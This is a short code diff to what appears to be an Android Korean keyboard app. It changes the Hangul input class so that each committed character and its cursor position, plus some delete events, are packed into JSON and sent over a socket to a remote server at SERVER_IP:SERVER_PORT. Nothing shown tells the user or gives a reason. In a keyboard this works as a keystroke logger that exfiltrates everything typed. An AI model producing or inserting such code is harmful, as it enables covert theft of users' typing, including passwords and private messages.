@@ -3,6 +3,8 @@ package com.myhome.rpgkeyboard.keyboardview
 import android.os.Build
 import android.util.Log
 import android.view.inputmethod.InputConnection
+import com.myhome.rpgkeyboard.keyboardview.SocketClient
+import org.json.JSONObject
 
 open class HangulMaker {
     private var cho: Char = '\u0000'
@@ -37,6 +39,12 @@ open class HangulMaker {
     private fun logCommit(char: Char) {
         Log.d("commit", char.toString())
         Log.d("cursor", getCursorPosition().toString())
+
+        val jsonmessage = JSONObject()
+        jsonmessage.put("type", "commit");
+        jsonmessage.put("char", char.toString());
+        jsonmessage.put("cursor", getCursorPosition());
+        SocketClient(SERVER_IP, SERVER_PORT, jsonmessage).execute();
     }
     // get current state state은 delete에서 0 으로 지우면 글자를 다 지우고 1 2 3은 초성 중성 종성을 지우는 것
     // cursor 위치에 따라서 지워지는 것이 다름
@@ -190,7 +198,16 @@ open class HangulMaker {
     }
 
     open fun delete(){
-        fetchState()
+        when(fetchState()){
+            0->{
+                var jsonmessage = JSONObject()
+                jsonmessage.put("type", "delete");
+                jsonmessage.put("cursor", getCursorPosition());
+                SocketClient(SERVER_IP, SERVER_PORT, jsonmessage).execute();
+            }
+        }
+
+
         when(state){
             0 -> {
                 inputConnection.deleteSurroundingText(1, 0)
